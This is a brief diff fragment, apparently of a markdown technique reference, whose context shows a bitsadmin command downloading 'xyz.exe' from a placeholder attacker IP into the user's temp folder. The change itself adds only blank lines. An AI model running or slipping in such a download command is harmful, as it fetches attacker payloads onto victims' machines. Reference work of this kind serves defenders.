@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:10.298426+00:00'
 ```powershell
 bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
 ```
+
+
